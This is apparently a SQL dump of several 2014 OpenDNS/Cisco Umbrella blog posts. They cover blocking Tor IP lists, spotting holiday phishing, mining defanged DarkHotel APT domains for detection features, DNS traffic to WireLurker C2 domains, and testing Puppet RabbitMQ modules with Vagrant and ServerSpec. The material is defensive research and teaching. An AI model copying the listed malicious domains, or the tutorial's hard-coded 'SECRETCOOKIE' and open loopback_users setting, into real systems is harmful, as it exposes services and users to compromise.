http://torstatus.blutmagie.de/ip_list_all.php/Tor_ip_list_ALL.csv > Tor_ip_list_ALL.csv\nThe output will create these two files:\nTor_ip_list_EXIT.csv\nTor_ip_list_ALL.csv\nEssentially what you are doing at this point is cutting off the call-out from a machine to the first entry point in the TOR relay circuits, preventing connections to be established. I should mention that while this will block malicious connections that use the TOR network, it will also cut off any legitimate web site that might be hosted on the same IP that is not a hidden service AND will prevent you from using TOR altogether.\nHopefully you find these three, yet significant, steps helpful to mitigating risk during your Internet experience.', 'Open Source;Security Community;Security Research', 'https://umbrella.cisco.com/blog/2014/11/21/3-simple-steps-towards-safer-browsing/');
INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1457, 'Avoid Scams While Shopping Online This Holiday Season', 'Kristyanne Patullo', 'November 21, 2014', 'It’s almost the most wonderful time of the year! Most people might consider that the December holiday season but for me it’s definitely Black Friday and Cyber Monday. Gone are the days of pitching a tent outside of Best Buy at 3am—you can now get all the awesome deals from the convenience of your couch!\nThe problem is, as with most large events on the Internet, there will be more people than usual looking for ways to cash in on unsuspecting shoppers. Using OpenDNS can help prevent you from falling victim to these attacks, but here are a few other tips on how to increase your safety and security while scoring some deals:\nCheck Where Your Emails are Coming From\nAs a savvy shopper I definitely love coupons. In my opinion, one of the best places to get coupons is via email. You have to be careful though–some of the deals really are too good to be true. Phishers are getting more advanced, and are always looking for better ways to trick people into clicking on their links. Sometimes determining whether an email is legitimate or a phish can be like deciphering the microscopic fine print that lists the exclusions on coupons.\nOne of the biggest indicators of a phishing email is where it’s coming from. Remember, these people make money off of tricking you. Many phishing emails look very legitimate and it often takes a diligent eye to spot a phish.\nOne of the first things that I do if I receive a suspicious-looking email is check the domain that the email came from. Most legitimate companies have their own domain from which all emails will be sent. In an email address, the part after the @ is the domain. The part before the domain is the local part, which is chosen, so it can say just about anything. Take a look at the below example:\nThe local part of the email address says macysshopping4, but remember that part can be chosen. Why would an email from Macy’s be sent from a Gmail account? A common phishing technique is to make the local part of an email address look legitimate to trick end users. The domain Macy’s coupons actually come from is @email.macys.com.\nEmail addresses can also be spoofed; a correct sending address does not necessarily mean the email is legitimate. Spoofing is when the sender email address is forged. Someone can forge sending you an email from shop@email.macys.com but it wasn’t actually sent by Macy’s. That is why you should also check the content of the email.\nCheck Before You Click\nDid you know that before you click, most browsers will show where the link you are hovering over goes?\n\nSimilar to emails, webpages also have domains. When I hover over a link in this email the browser shows me the location the link will take me to before I click on it. If I know this email is from Macy’s, it makes sense that links within this email should take me to macys.com.\nThe domain for a webpage is different than an email domain. The subdomain, domain, and top level domain are between the protocol and path of a URL:\nThe protocol declares how your browser should communicate with the web server you are browsing, but we’ll talk about this later.\nThe subdomain is a subdivision of the main domain. In the above example, community is a section of the domain opendns. Every domain ends in a top level domain (TLD), TLDs form the root zone of the DNS system. It’s important to check that the domain of a web page correlates with the web page you are intending to visit.\nThe path refers to the file or directory on the webserver where a particular URL lives. Like with the local part of an email address, the path can be edited to say anything.\nIf you are in an email you believe is from Macy’s, which URL is most likely not a phish?\nhxxp://www.macys.com/shop/womens-clothing\nor\nhxxp://www.xqnrr.com/macys/shop/womens-clothing?\nIf you chose the first URL you are correct. The domain of this URL is macys.com, which shows that this URL is hosted on the Macy’s domain and the path goes to the women’s clothing section. The second URL is hosted on the domain xqnrr.com but the path of the URL was made to look like it is a Macy’s website.\nConfirm You are Using a Secure Connection\nBefore you enter any payment or personal information into a website, make sure your browser is using an SSL (Secure Socket Layer) connection. SSL provides a secure connection between a web server and your browser. This helps ensure that a third party cannot easily view your payment/personal information.\nHow can you tell if your browser has a secure connection? The URL will start with https:// and you will see a lock in the address bar:\n\nAn https:// at the beginning of a URL indicates that the data you are transmitting will be encrypted between the client (your browser) and the end server (the server the website you are accessing is hosted on) to better protect your information.\nPaypal phishes are quite frequent; one way to spot a Paypal phish is that it will lack an SSL connection:\n\nThis specific phish also has the bonus of a spelling error which is also indicative of phishing pages and emails.\nAlso, be wary of pages that are asking you for unnecessary information. You shouldn’t need to enter your social security number to purchase a new iPad. Be cautious of the data you are providing/putting out on the World Wide Web.\nMake Sure Your Computer/Device is Virus Free and Up to Date\nBefore the big shopping day you should confirm that the computer or device you will be using for shopping is not infected with malware or adware and that all updates have been completed.\nIf your computer has malware on it your information becomes very easy to steal. Certain types of malware install keyloggers on your machine that can record every keystroke and provide malicious parties with usernames, passwords, credit card numbers, and any other personal information that you type. Any type of malware or adware on your machine makes it less secure, so be sure to use up-to-date AntiVirus that scans your machine regularly for these types of infections.\nAlso make sure that all updates have been completed on your machine. Many updates, particularly for your operating system and browser, contain security patches that protect you from known vulnerabilities.\nUse OpenDNS!\nOur DNS service offers an added layer of security that will protect you from known phishing sites. If you do happen to come across a shady site while shopping you’ll see the OpenDNS block page rather than a page that can potentially steal your data or infect your machine.\nBe Smart\nThe best way to be safe while shopping on the Internet is to be smart about what you are doing. Take the necessary precautions to make sure your computer or device is clean and updated. Also take the extra minute to confirm that the email or website you are viewing is safe. Sometimes being safe can be time consuming, but it will take a lot less time than you’d have to spend reclaiming stolen information, fighting fraud charges, or in extreme cases, reclaiming your identity.', 'Blog;Security 101', 'https://umbrella.cisco.com/blog/2014/11/21/avoid-scams-online-shopping-holiday-season/');

What is fascinating about this particular syndicate is their advanced skill set, and ability to leverage high-level penetration techniques to accomplish their goal (ex. kernel mode key logger, reverse engineering certs, and 0-day exploits).\nIn addition, after successful exfiltration of the targeted data, they are able to remove any trace of their existence from the network, making it much harder for security professionals to put the pieces of the puzzle back together.\nThis blog is a deep dive into mining domains associated with the DarkHotel attackers, and an attempt to extract any patterns in their behavior. Some of the techniques we employed were mining WHOIS records, GeoIP data, ASN/Organization data, and performing natural language text processing on the actual DarkHotel domains themselves.\nDarkHotel attacks usually begin by compromising a hotel’s Wi-Fi network and targeting the victim by tricking them into downloading/installing a backdoor. For example, they may send a phishing email targeting an executive, saying their current version of Adobe Flash or anti-virus software needs to be upgraded.\nThinking about this from an attacker perspective, we would need to somehow advertise the link to click on to the victim. How would we go about doing this? Well, in general, people always like to get stuff for free, so we may include the word “free” or “cheap” in the domain. Additionally, less-tech savvy business execs or politicians are not aware of these means of infection, and are more likely to click on a link saying they need to update their software, improve security, or possibly read some sort of business or news site. Let’s take a look at some examples:\nTypically, malicious domains fall into the pattern of using common “abuse” words, which is why we decided to use natural language text processing techniques for this experiment. One of the techniques we used to analyze these domains was to extract all the words found in the English dictionary and try to find any commonalities. We also leveraged a natural language processing technique from the Python NLTK library called stemming to help increase accuracy when extracting the most important words from a text.\nStemming is a normalization technique which extracts the root of the word, and subjects it to a series of transformations such as stripping out common prefixes or suffixes. To give an example, the word “countries” would become “countri” after stemming. One of the reasons we chose stemming was to get the most accurate evaluation of a domain, and to lower the false negative rate.\nFor example, when we compared the DarkHotel domains against domain examples found in the Mandiant APT 1 report, there were domains such as applesoftupdate[.]com and webserviceupdate[.]com. Without stemming, if we had just taken the dictionary word “update”, we would have missed domains like firefoxupdata[.]com. Here are some of the results after extracting the top dictionary words out of the DarkHotel domains list:\nauto: 75 occurrences\nupdat: 32\nserv: 18\nfree: 25\nonline: 6\nnews: 10\n(Also worth mentioning: 10 occurrences of “autoupdate”)\nWhat is interesting to note is that both APT and DarkHotel domains share common “themes” and obfuscation techniques. Some of these themes can be found in the report under the category “naming themes” (p. 48). Both sets of domains seem to share common themes of containing words related to “news” and “technology”. For example, some news related domains found among DarkHotel domains are:\ndailynews[.]000page[.]com\ninnewsmessenger[.]com\nnewsagencypool[.]com\nHere are some of the domains associated with news found in Mandiant’s report:\nmyyahoonews[.]com\nnewsesport[.]com\nnewsonet[.]net\nnewsonlinesite[.]com\nThis make sense, as it is more likely that business executives would be interested in clicking on news links to read while browsing online in their room. DarkHotel domains also use methods of attaching themselves to well-known technology/software related companies to make them seem more legitimate to the victim. Here are some examples found in both sets trying to attach themselves with established tech companies:\nDarkHotel Domains:\nmicrosoft-xpupdate[.]com.\njavaupdate[.]flashserv[.]net\nadobearm[.]com\nAPT 1 domains:\nmicrosoft-update-info[.]com\nfirefoxupdata[.]com\ngmailboxes[.]com\nSimilarly, spoofing of security products/domains occurs in both sets: in the APT 1 report: symanteconline[.]net, mcafeepaying[.]com, and in DarkHotel domains: secureonline[.]net, checkingvirusscan[.]com.  Basically, they are targeting the victim’s lack of tech knowledge—advertising to upgrade the security of their system would obviously be a priority for a high-level executive or politician.\nAnother feature of DarkHotel domains that we analyzed were their ASN (Autonomous System Number). We found that a lot of these domains come from obscure ASNs/registrars that were previously associated with domains exhibiting malicious behavior. Generally, malicious domains like these are associated with lesser-known ASNs/Orgs, and have very limited restrictions on abuse. Here are the top 10 ASNs the DarkHotel domains were associated with:\n\nOne example of a potential abuse-detection mechanism we found when researching DarkHotel domain/ASN mappings is the domain microsoft-xupdate[.]info. If this domain really was a Microsoft update tool, wouldn’t it make sense for it to come from an ASN or Registrar associated with Microsoft, like ASN 8075, Microsoft Corporation? However, it’s associated with ASN 21740, eNom Incorporation, whose rank is 6135—which raises some suspicion.\nSimilar logic can be applied to adobeplugs[.]net which comes from ASN 3388, LeaseWeb, or adobeupdates[.]com from ASN 53665,  Bodis. Why would it not be associated with Adobe Systems, whose ASN is 1313? These inconsistencies definitely lead to more suspicion about these domains.\nWe also used GeoIP/MaxMind to do country code lookups on the DarkHotel domains, and here are some of our top results:\nUnited States: 113\nNetherlands: 47\nUK: 27\nGermany: 19\nMalaysia: 16\nThailand: 6\nSwitzerland: 6\nIt is interesting to see that several of them are from the US, since most of the reported attacks are from East Asia. Generally though, these country stats are pretty consistent with APT behavior, a lot of which resolve to locations in the U.S. Here is the geographic breakdown:\nWe also mined another data set associated with these DarkHotel domains—their WHOIS records. Interestingly, we found that many of the domains have been updated very recently. A majority of the domains have been updated in the last few months, and some within the last few weeks. This is generally not the case when dealing with legitimate domains (ex. Alexa Top 1000) that very rarely update their domain registration records.\nThis is another indicator of abuse, as attackers have to constantly evolve to stay ahead of detection mechanisms. Another curious fact: although the domains were updated recently, many of these domains were created quite some time ago. Here are some our domain results with particularly old creation dates and very recent modification dates:\nDomains: microchsse[.]strangled[.]net, www[.]strangled[.]net, automobiles[.]strangled[.]net\nCreation time: 9/24/1999\nUpdate time: 9/9/2014\nDomains: microblo5[.]mooo[.]com, microchisk[.]mooo[.]com\nCreation time: 3/24/2000\nUpdate time: 3/8/2014\nDomain: codec[.]servepics[.]com\nCreation time: 6/1/2001\nUpdate time: 8/15/2014\nDomain: www[.]universalonline[.]com\nCreation time: 3/12/2000\nUpdate time: 2/11/2014\nDomain: redlooksman[.]servehttp[.]com\nCreation time: 8/1/2000\nUpdate time: 8/13/2014\nSeveral of these domain creation dates span back over 10 years with some dating as far back as 1999. This suggests that the DarkHotel campaign may in fact have been going on for longer than we expected. It’s intriguing to see these old creation dates alongside the recently updated information, which implies these domains are being routinely maintained. This deserves further investigation, and could potentially be used as another detection mechanism.\nAfter analyzing these results, we have come to the conclusion that there are certain patterns in DarkHotel domain data, and that threat actors are replicating proven tactics.  The next step would be to program these findings into a feature detection algorithm and apply deeper inspection of our results.\nThe text analysis of the domain and ASN information seemed to be the most revealing, and promising for feature detection. While the geo-diversity analysis was interesting to see, it did not reveal enough info to convert into a feature. The recently updated WHOIS records, and the fact that many of these domains have been created quite some time ago is also fascinating, but deserves deeper analysis before turning into a feature.', 'Big Data;Security Research;Security Tools', 'https://umbrella.cisco.com/blog/2014/11/19/data-mining-deep-dive-darkhotel-domains/');

This blog post will be looking at a month’s worth of DNS traffic history to the two sites associated with WireLurker.\nWireLurker was delivered to the user via unsanctioned third-party apps. The WireLurker network infrastructure was composed of two components – a delivery mechanism and a command and control (C2) server. The authors of WireLurker used the popular third-party app site app[.]maiyadi[.]com to deliver seemingly benign apps to user. Once infected, the trojan would contact the C2 server comeinbaby[.]com.\nLet us first take a look at the historical traffic pattern of app[.]maiyadi[.]com and comeinbaby[.]com. Looking at the traffic graph for a months worth of traffic for app[.]maiyadi[.]com shows that it follows a typical diurnal pattern. Upswings during the day and downswings during the night. This is the sort of traffic that would be associated with a website attracting normal traffic.\nTraffic for app[.]maiyadi[.]com\n\nThe traffic for comeinbaby[.]com is far more interesting. Looking at traffic from Oct 18 – 20, one observes an almost constant level of traffic to the website. This could indicate that there was a high level of  communication between C2 server and infected host. The 21st sees a brief spike in traffic and then an increase in overall traffic. Surprisingly, this upswing in traffic is not maintained as traffic dips back down to Oct 18 – 20 levels. The large spikes seen towards the end of the graph came from Palo Alto’s announcement.\nTraffic for comeinbaby[.]com\n\nThe sample DNS query data for comeinbaby[.]com and app[.]maiyadi[.]com analyzed came from Oct 20th, Oct 25th and Nov 6th. We wanted to examine the behavior of the site around the time of spike activity and normalcy.\nAs was expected, the majority of traffic came from ASNs located in either Hong Kong or mainland China. During the Nov 6th spike we also noticed an increase in traffic to both sites from Europe and the US. An investigation into these new visitors led us to conclude that they were not infected users but instead security researchers who had heard Palo Alto Network’s announcement. A quick look at our sinkhole validates this as there are numerous connections to the comeinbaby[.]com domain from machines not using mobile browser user agents.\n\nWith user agent strings that appear to be associated with a PC’s browser, and not a mobile device’s browser.\n\nWhat we wanted to examine were infected user interactions with the server. We created a set of users who had interacted with both comeinbaby[.]com and app[.]maiyadi[.]com on October 20th and 25th. Examining the DNS traffic history from this set showed some interesting behavior such as the frequent communication between the infected user and the C2 server. This frequent communication between user and server could possibly indicate that these were users infected with WireLurker A. WireLurker A had a daemon process that frequently made pull updates from the command server.\nWith regards to co-occurring domains, it was quite interesting that comeinbaby[.] had absolutely no co-occurring domains. You can see its isolation in the OpenGraphiti model.\n\nConversely, the app[.]maiyadi[.]com had numerous co-occurring domains including several that we have previously identified as malicious.\n\nWe will continue to monitor the WireLurker domains for interesting variations as time goes on. One initial observation is that an IP associated with a known malicious actor from Ukraine also visited comeinbaby[.]com. This actor will continue to be tracked and, should any relevant attribution be discovered, the methods will be discussed in a future blog post.

Oh sure, it’s got fancy names like “configuration management” or “desired-state convergence-based system administration”, but it’s code, pure and simple. In order to achieve this scale and move faster, I’ve had to acquire knowledge from the programmers around me: things like revision control, modularized programming, and automated testing.\nNow I document my code. Puppet-lint keeps my commits from making the parser cry. I create feature branches and ask for code reviews. But how do you test something that’s meant to change machines irrevocably, without either taking forever to stand up new machines (whether bare-metal or virtual), or skipping the whole thing and putting your infrastructure at risk?\nFor the longest time, “testing” meant “roll out changes, but keep one finger over the big red button.” Now, there are two tools that improve the situation:\nVagrant, for frictionless creation, provision and destruction of virtual machines\nServerSpec, for testing services and functionality\nAssumptions and code\nI’m going to assume:\nYou have Vagrant installed already, and have worked your way through the awesome docs; you know “vagrant up”, “vagrant ssh” and “vagrant destroy”, and have at least looked at a Vagrantfile before.\nYou have Ruby set up already.\nYou have a passing familiarity with Puppet.\nThe examples in this post, along with some setup scripts and background information, have been shared on GitHub; you can find them here. The repo is organized into three examples, and as we go along I’ll mention which one we’re at.\nOne important note: I’m testing Puppet — but there is nothing in this approach that requires Puppet.  You could swap it out with CFEngine, Ansible or just about any other configuration management tool.\nProblem statement\nAs we continue to deploy systems and the complexity of the infrastructure grow, we have an increased need to test the software and solutions being introduced. In this post, let’s use the deployment of  RabbitMQ as an example.\nLet’s get this party started\nWhere do we start?  Let’s initialize Vagrant with the usual three-step:\nmkdir testing\n cd testing\n testing vagrant init hashicorp/precise64\nThis gave me a 64-bit version of Ubuntu 12.04, with Puppet 2.7 pre-installed, that is ready to boot.  I wrote a simple Puppet manifest to install RabbitMQ and saved it as “manifests/init.pp”:\npackage { \'rabbitmq-server\':\n  ensure => installed,\n}\n(In the code repo for this post, you’ll find the Vagrantile and the Puppet manifest in the “example_1” directory.) Next, I set up a directory for Puppet modules we’ll use later on in this tutorial:\ntesting $ mkdir -p manifests ~/puppet/modules\nFinally, I edited that Vagrantfile and added the bits I want. When I was done, it looked like this:\nVAGRANTFILE_API_VERSION = \"2\"\n\nVagrant.configure(VAGRANTFILE_API_VERSION) do |config|\n  # FORESHADOWING: This will let me add another VM later.\n  config.vm.define \"rabbit\" do |rabbit|\n    rabbit.vm.box = \"hashicorp/precise64\"\n    rabbit.vm.hostname = \"rabbit.example.com\"\n    rabbit.vm.network \"private_network\", ip: \"192.168.50.100\"\n    rabbit.vm.provision :puppet do |puppet|\n      puppet.manifest_file  = \"init.pp\"\n      puppet.module_path = \"~/puppet/modules\"\n      # Need to set the fqdn here as well; see\n      # http://www.benjaminoakes.com/2013/04/25/making-puppets-fqdn_rand-play-nice-with-vagrant/\n      puppet.facter = { \'fqdn\'  => rabbit.vm.hostname }\n    end\n  end\nend\nI booted the VM by running “vagrant up”.  This:\nbooted the VM\nset the hostname to rabbit.example.com\ngave the VM a second network interface with the IP address 192.168.50.100\nrecursively copied the manifest_file, and everything under module_path, into the VM, and ran puppet apply with those copied files in its path\nLet me emphasize that last part: I gave it the path to my laptop’s local copy of our Puppet codebase (~/puppet/modules), and Vagrant was smart enough to copy it to the VM, point Puppet at those files, and run the code in init.pp.  I didn’t have to set paths, or run rsync myself, or anything.\nThis is good, but the fine folks at PuppetLabs have a module for managing RabbitMQ on PuppetForge.  (We need to use version 4.0.0 due to an incompatibility with Puppet 2.7; see the README in the code repo for details.)  I added it to the modules directory, and changed manifests/init.pp to make use of it:\nclass { \'rabbitmq\':\n  environment_variables    => {\n    \'RABBITMQ_NODENAME\'    =>\'${hostname}\',\n    \'RABBITMQ_SERVICENAME\' => \'RabbitMQ\',\n  },\n  port                     => \'5672\',\n  config_cluster           => true,\n  # We\'ll need a second machine later on...\n  cluster_nodes            => [\'rabbit.example.com\', \'coney.example.com\'],\n  cluster_node_type        => \'ram\',\n  erlang_cookie            => \'SECRETCOOKIE\',\n  wipe_db_on_cookie_change => true,\n  require                  => File[\"/usr/local/bin/puppet\"],\n  config_variables         => { \'loopback_users\' = \'[]\', },\n}\n\n# The PuppetLabs module invokes Puppet itself to restart the\n# RabbitMQ service when setting the erlang_cookie -- but it sets the\n# PATH environment variable manually, and it doesn\'t include the *real*\n# location of puppet in this machine.  The simplest is to symlink it\n# to /usr/local/bin, which *is* in PATH.\n\nfile { \'/usr/local/bin/puppet\':\n  ensure => \"link\",\n  target => \"/opt/vagrant_ruby/bin/puppet\",\n}\n\nhost { \'rabbit.example.com\':\n  ip           => \"192.168.50.100\",\n  host_aliases => \"rabbit\",\n}\n\npackage { \"python-pika\":\n  ensure => installed,\n}\n(This manifest is in the “example_2” directory in the code repo.)  This ensures a few things:\n1. The “class rabbitmq” stanza sets parameters for the RabbitMQ module.  In particular, it starts up a RAM-based RabbitMQ server — one that keeps queued messages in memory, rather than on disk.  (This is not what we’d want in production, but it simplifies this example.)\n2. It links the Vagrant box’s copy of puppet to /usr/local/bin so that the RabbitMQ module can find it.\n3. It adds an entry to /etc/hosts for this machine, and it specifies erlang_cookie.  (Once we get to two nodes, this is what will allow them to find and trust each other.)\n4. It installs Pika, a Python module that can talk to RabbitMQ. (We’ll use this for testing up ahead.)\nAnd sure enough, look at the output when I run vagrant up:\n==> rabbit: notice: /Stage[main]//Host[rabbit.example.com]/ip: ip changed \'127.0.1.1\' to \'192.168.50.100\'\n    ==> rabbit: notice: /Stage[main]//Package[python-pika]/ensure: ensure changed \'purged\' to \'present\'\n    ==> rabbit: notice: /Stage[main]//File[/usr/local/bin/puppet]/ensure: created\n    ==> rabbit: notice: /Stage[main]/Staging/File[/opt/staging]/ensure: created\n    ==> rabbit: notice: /Stage[main]/Rabbitmq::Repo::Apt/Apt::Source[rabbitmq]/Apt::Key[Add key: 056E8E56 from Apt::Source rabbitmq]/Apt_key[Add key: 056E8E56 from Apt::Source rabbitmq]/ensure: created\n    ==> rabbit: notice: /Stage[main]/Rabbitmq::Repo::Apt/Apt::Source[rabbitmq]/File[rabbitmq.list]/ensure: created\n    ==> rabbit: notice: /Stage[main]/Apt::Update/Exec[apt_update]: Triggered \'refresh\' from 1 events\n    ==> rabbit: notice: /Stage[main]/Rabbitmq::Install/Package[rabbitmq-server]/ensure: ensure changed \'purged\' to \'present\'\n    ==> rabbit: notice: /Stage[main]/Rabbitmq/Rabbitmq_plugin[rabbitmq_management]/ensure: created\n    ==> rabbit: notice: /Stage[main]/Rabbitmq::Config/Exec[wipe_db]/returns: executed successfully\n    ==> rabbit: notice: /Stage[main]/Rabbitmq::Config/File[erlang_cookie]/content: content changed \'{md5}e61788fe3ab925930d62d117867cac63\' to \'{md5}0ca06bb8047f9c6114f69740cfa30798\'\n    ==> rabbit: notice: /Stage[main]/Rabbitmq::Config/File[rabbitmq.config]/ensure: defined content as \'{md5}55484d623e0779fcc83a04688134363f\'\n    ==> rabbit: notice: /Stage[main]/Rabbitmq::Config/File[/etc/rabbitmq/ssl]/ensure: created\n    ==> rabbit: notice: /Stage[main]/Rabbitmq::Config/File[rabbitmq-env.config]/ensure: defined content as \'{md5}892faaf5991c6693f12590688fbf12b9\'\n    ==> rabbit: notice: /Stage[main]/Rabbitmq::Service/Service[rabbitmq-server]/ensure: ensure changed \'stopped\' to \'running\'\n    ==> rabbit: notice: /Stage[main]/Rabbitmq::Service/Service[rabbitmq-server]: Triggered \'refresh\' from 1 events\n    ==> rabbit: notice: /Stage[main]/Rabbitmq::Install::Rabbitmqadmin/Staging::File[rabbitmqadmin]/Exec[/var/lib/rabbitmq/rabbitmqadmin]/returns: executed successfully\n    ==> rabbit: notice: /Stage[main]/Rabbitmq::Install::Rabbitmqadmin/File[/usr/local/bin/rabbitmqadmin]/ensure: defined content as \'{md5}63d7331e825c865a97b7a8d1299841ff\'\n    ==> rabbit: notice: Finished catalog run in 79.90 seconds\nI’ll emphasize once more: this process will work with any configuration management system you apply.\nBut how do I know this works?  I can SSH into the machine and check processes, but I’d like to make sure it’s doing useful work — and shouldn’t we automate this checking?\nOnly one solution:  it’s time for testing!\nServerSpec\nServerSpec is a test framework for machines (whether virtual or bare metal).  It’s built on Ruby’s RSpec and it lets you write tests for files, processes, services and packages.  The tests are pretty easy to understand and write, even if you’ve never used Ruby before, and it’s smart enough to know how to run tests on remote machines or Vagrant instances.\nYou can set up ServerSpec and Rake (a Make-like utility for Ruby) like so:\n$ gem install serverspec rake\n(From here on, everything — the ServerSpec files, the Vagrantfile and the Puppet code — can be found in the “example_3” directory of the code repo.)\nFirst tests\nFirst I want to know whether we’ve actually installed the RabbitMQ package.  I start by setting up ServerSpec like so on the host, and answering the questions it asks me: it’s a Unix machine, it runs SSH, it’s a Vagrant instance, and we want ServerSpec to auto-configure from the Vagrantfile:\ntesting $ serverspec-init\nSelect OS type:\n  1) UN*X\n  2) Windows\nSelect number: 1\nSelect a backend type:\n  1) SSH\n  2) Exec (local)\nSelect number: 1\nVagrant instance y/n: y\nAuto-configure Vagrant from Vagrantfile? y/n: y\nIt creates a skeleton test file in spec/rabbit/sample_spec.rb, which tests for a web server — the usual “Hello, world!” of configuration management. I renamed that to rabbitmq_spec.rb for clarity, and started out with my own test:\n# Boilerplate required by ServerSpec\nrequire \'spec_helper\'\n\n# And now a test!\ndescribe package(\'rabbitmq-server\') do\n  it { should be_installed }\nend\nPretty easy to understand — there’s a package, we want it installed.\nAt last, we can run the test with the “rake” command:\ntesting $ rake\n  Package \"rabbitmq-server\"\n    should be installed\nFinished in 4.44 seconds (files took 0.27236 seconds to load)\n1 example, 0 failures\nThis test passed!  Now let’s ensure the service is running, will start at boot time and is listening on the right ports.  I add this to rabbitmq_spec.rb:\ndescribe service(\'rabbitmq-server\') do\n  it { should be_enabled   }\n  it { should be_running   }\nend\n\ndescribe port(15672) do\n  it { should be_listening }\nend\n\ndescribe port(5672) do\n  it { should be_listening }\nend\nAnd here’s the output:\nPackage \"rabbitmq-server\"\n  should be installed\n\n  Service \"rabbitmq-server\"\n    should be enabled\n    should be running\n\n  Port \"15672\"\n    should be listening\n\n  Port \"5672\"\n    should be listening\n\nFinished in 4.81 seconds (files took 0.26969 seconds to load)\n5 examples, 0 failures\nLooks good so far — but wouldn’t it be nice to test RabbitMQ?  Let’s exercise things a bit with a couple of Python scripts from RabbitMQ’s fine documentation:\ndescribe command(\'/vagrant/send.py localhost\') do\n  its(:stdout) { should match /[x] Sent \'Hello World!\'/ }end\n\ndescribe command(\'/vagrant/receive_once.py localhost\') do\n  its(:stdout) { should match /Hello World!/ }\nend\nRun the tests again:\nPackage \"rabbitmq-server\"\nshould be installed\n\nService \"rabbitmq-server\"\nshould be enabled\nshould be running\n\nPort \"15672\"\nshould be listening\n\nPort \"5672\"\nshould be listening\n\nCommand \"/vagrant/send.py localhost\"\nshould return stdout /[x] Sent \'Hello World!\'/\n\nCommand \"/vagrant/receive_once.py localhost\"\nshould return stdout /Hello World!/\n\nFinished in 4.79 seconds (files took 0.26903 seconds to load)\n7 examples, 0 failures\nThis was meant to be a slaved setup — and this is just one machine.  Can we test a distributed setup?\nVersion two: Multiple Vagrant machines (or, Vagrant and ServerSpec go to 11)\nLet’s start by having two machines created by Vagrant.  Here’s our new Vagrantfile:\nVAGRANTFILE_API_VERSION = \"2\"\n\nVagrant.configure(VAGRANTFILE_API_VERSION) do |config|\n  # Arbitrarily designate coney as slave; bring it up first.\n  config.vm.define \"coney\" do |coney|\n    coney.vm.box = \"hashicorp/precise64\"\n    coney.vm.hostname = \"coney.example.com\"\n    coney.vm.network \"private_network\", ip: \"192.168.50.101\"\n    coney.vm.provision :puppet do |puppet|\n      puppet.manifest_file = \"init.pp\"\n      puppet.module_path = \"~/puppet/modules\"\n      puppet.facter = { \'fqdn\'  => coney.vm.hostname,\n                        \'flags\' => \'rabbitmq_slave\'\n                      }\n    end\n  end\n\n  # rabbit is master; bring it up last, once slaves are up.\n  config.vm.define \"rabbit\" do |rabbit|\n    rabbit.vm.box = \"hashicorp/precise64\"\n    rabbit.vm.hostname = \"rabbit.example.com\"\n    rabbit.vm.network :forwarded_port, guest: 5672, host: 5672\n    rabbit.vm.network :forwarded_port, guest: 15672, host: 15672\n    rabbit.vm.network \"private_network\", ip: \"192.168.50.100\"\n    rabbit.vm.provision :puppet do |puppet|\n      puppet.manifest_file = \"init.pp\"\n      puppet.module_path = \"~/puppet/modules\"\n      puppet.facter = { \'fqdn\'  => rabbit.vm.hostname,\n                        \'flags\' => \'rabbitmq_master\'\n                      }\n    end\n  end\nend\nThere are a few things to note about this new file:\n1. We’re configuring two machines here.\n2. Each has a separate interface connected to each other; that’s what we’ll use for testing Rabbit.\n3. We have to redo our ServerSpec setup.\nTests!\nIn order to test two machines, we’ll put our test in two different directories named after each machine: spec/coney/rabbitmq_spec.rb, and spec/rabbit/rabbitmq_spec.rb.  Each spec file will have the tests we showed above to make sure that its own, local copy of RabbitMQ is working.  We’ll also add a test on each node to make sure RabbitMQ has been clustered correctly with the other node:\ndescribe command(\'/usr/sbin/rabbitmqctl cluster_status | grep running_nodes\') do\n  it { should return_stdout /running_nodes/ }\n  it { should return_stdout /rabbit@coney/ }\n  it { should return_stdout /rabbit@rabbit/ }\nend\nFinally, let’s send a message on one and see if it shows up on the other.  We’ll add this test to rabbit’s spec file:\ndescribe command(\'/vagrant/send-mirrored.py\') do\n   it { should return_stdout /[x] Sent \'Hello Mirror World!\'/ }\nend\n…and we’ll test reception by adding this on coney’s spec file:\ndescribe command(\'/vagrant/receive_once-mirrored.py\') do\n  it { should return_stdout /Hello Mirror World!/ }\nend\nOkay, time to run!\nconey\n  Non-mirrored queue\n    Rabbit\n      Command \"/vagrant/send.py -s rabbit\"\n        should return stdout /[x] Sent \'Hello World!\'/\n      Command \"/vagrant/receive_once.py -s rabbit\"\n        should return stdout /Hello World!/\n  Mirrored queue\n    Command \"/vagrant/send-mirrored.py\"\n      should return stdout /[x] Sent \'Hello Mirror World!\'/\n\nrabbit\n  Non-mirrored queue\n    Coney\n      Command \"/vagrant/send.py -s coney\"\n        should return stdout /[x] Sent \'Hello World!\'/\n      Command \"/vagrant/receive_once.py -s coney\"\n        should return stdout /Hello World!/\n  Mirrored queue\n    should return stdout /Hello Mirror World\'/\nAll the tests have passed, and now I can hand this to my coworkers.\nWhat went well, what could be improved, and where do we want to take this?\nFirst off:  this builds on the smart work of a lot of different projects: Vagrant, ServerSpec, and of course Puppet.  And if you haven’t read “Test-Driven Infrastructure with Chef”, you should; I’ve taken a lot of inspiration from that, and I can’t recommend it enough.\nSecond, this is a promising approach to a question that can seem intractable: how do you increase the velocity of an engineering team when you’re dealing with real machines?  Testing code lets you be sure that you’re doing what you expect, and you’re not doing anything unexpected (like breaking services).\nThird, I’ve already started using this approach when dealing with tickets.  For example, recently I had to deal with a Varnish configuration that served blank pages when the back end 503’d, instead of serving from the cache as intended.  I was able to duplicate the problem, come up with a failing test, then pound on the configuration until the test passed.\nHowever, it’s not perfect.  One reason is that we have a large Puppet code base. Bringing in random modules for testing is hard to do without, for example, changing sudoers (which breaks Vagrant in really fun ways). These modules were written under the (quite valid!)  assumption that they were for production use, and that they had a free hand in changing the machine as they saw fit.  Bolting testing on afterward is a tough job.\nFinally, there is a lot of boilerplate in the Rspec tests; even something as simple as “these two machines should be able to talk over port 1234 via TCP” works out to a lot of tests, each of which need to be configured correctly.\nStill…this is good, and a needed improvement in our work.  Regression tests, unit tests, integration tests, acceptance tests: they’re within reach.  We can do things better; on our best days we can do things not just correctly, but Right.', 'Docker;Scale;Security Engineering', 'https://umbrella.cisco.com/blog/2014/11/13/testing-puppet-modules-vagrant-serverspec/');

